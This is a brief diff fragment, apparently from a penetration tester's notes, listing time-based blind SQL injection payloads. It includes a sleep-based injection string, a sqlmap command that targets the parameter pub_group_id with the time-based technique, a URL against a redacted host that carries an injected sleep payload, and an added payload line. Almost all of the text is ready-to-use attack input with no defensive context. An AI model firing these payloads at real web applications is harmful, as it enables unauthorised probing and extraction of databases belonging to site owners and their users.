@@ -6,3 +6,5 @@ admin’ and (select * from(select(sleep(40)))SQLI) and ‘abc’ = ‘abc
 sqlmap.py -r test.txt --dbms=mysql --technique=T -p pub_group_id --banner --force-ssl --level=5
 
 https://reducted.com/pubs/move_papers.php?pub_group_id=a'%2b(select*from(select(sleep(5)))a)%2b'
+
++(select*from(select(sleep(5)))a)+
